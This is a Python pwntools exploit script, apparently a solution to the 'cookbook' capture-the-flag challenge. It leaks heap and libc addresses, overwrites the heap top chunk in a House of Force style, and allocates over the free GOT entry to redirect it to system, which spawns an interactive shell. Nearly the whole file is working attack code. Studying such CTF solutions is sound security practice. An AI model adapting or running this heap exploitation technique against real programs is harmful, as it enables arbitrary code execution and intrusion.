from pwn import *
context.log_level = "debug"

#HOST = "192.168.0.19"
#HOST = "cookbook.bostonkey.party"
#PORT = 4444
#PORT = 5000

s = process("./cookbook")
pause()

elf = ELF("./cookbook")
libc =  elf.libc

puts_plt = elf.plt["puts"]
free_got = elf.got["free"]
calloc_got = elf.got["calloc"]

calloc_off = libc.symbols["calloc"]
system_off = libc.symbols["system"]

def func_ingredient(func):
    s.recvuntil("[q]uit\n")
    s.sendline("a")

    s.recvuntil("[e]xport saving changes (doesn't quit)?\n")
    s.sendline(func)

    s.recvuntil("[e]xport saving changes (doesn't quit)?\n")
    s.sendline("q")

def func_recipe(func):
    s.recvuntil("[q]uit\n")
    s.sendline("c")

    s.recvuntil("[q]uit\n")
    s.sendline(func)

    s.recvuntil("[q]uit\n")
    s.sendline("q")

s.recvuntil("what's your name?\n")
s.sendline("/bin/sh\0") # name

func_recipe("n")
func_ingredient("n")
func_recipe("d")

# heap_leak
s.recvuntil("[q]uit\n")
s.sendline("c")
s.recvuntil("[q]uit\n")
s.sendline("p")
s.recvuntil("(null)\n\n")
heap_leak = int(s.recvuntil(" "), 10)

TOP_chunk = heap_leak + 0x20

print
log.info("TOP_chunk : " + hex(TOP_chunk))

s.recvuntil("[q]uit\n")
s.sendline("q")

# libc_leak
s.recvuntil("[q]uit\n")
s.sendline("g")

s.recvuntil("how long is the name of your cookbook? (hex because you're both a chef and a hacker!) :")
s.sendline("40c")

payload = p32(calloc_got) * 2
s.sendline(payload)

s.recvuntil("[q]uit\n")
s.sendline("c")
s.recvuntil("[q]uit\n")
s.sendline("p")
s.recvuntil("(null)\n\n")
libc_calloc = 0x100000000 + int(s.recvuntil(" "), 10)

libc_base = libc_calloc - calloc_off
libc_system = libc_base + system_off

log.info("libc_base : " + hex(libc_base))
log.info("libc_calloc : " + hex(libc_calloc))
log.info("libc_system : " + hex(libc_system))
print

s.recvuntil("[q]uit\n")
s.sendline("q")
s.recvuntil("[q]uit\n")
s.sendline("R")

# overwrite_TOP_chunk
func_ingredient("d")
func_recipe("n")

s.recvuntil("[q]uit\n")
s.sendline("c")
s.recvuntil("[q]uit\n")
s.sendline("i")
payload = "A"*0x380
payload += "\xff\xff\xff\xff" # TOP_chunk
s.sendline(payload)
s.sendline("q")

s.recvuntil("[q]uit\n")
s.sendline("g")
s.recvuntil("how long is the name of your cookbook? (hex because you're both a chef and a hacker!) :")
chunk_size = 0x100000000 + (free_got - 0x10 - TOP_chunk) - 0x4
s.sendline(str(hex(chunk_size))[2:])

s.recvuntil("[q]uit\n")
s.sendline("g")
s.recvuntil("how long is the name of your cookbook? (hex because you're both a chef and a hacker!) :")
s.sendline("10")
payload = p32(puts_plt)
payload += "AAAA"
payload += p32(libc_system)
s.sendline(payload)

s.recvuntil("[q]uit\n")
#s.sendline("q")

s.interactive()

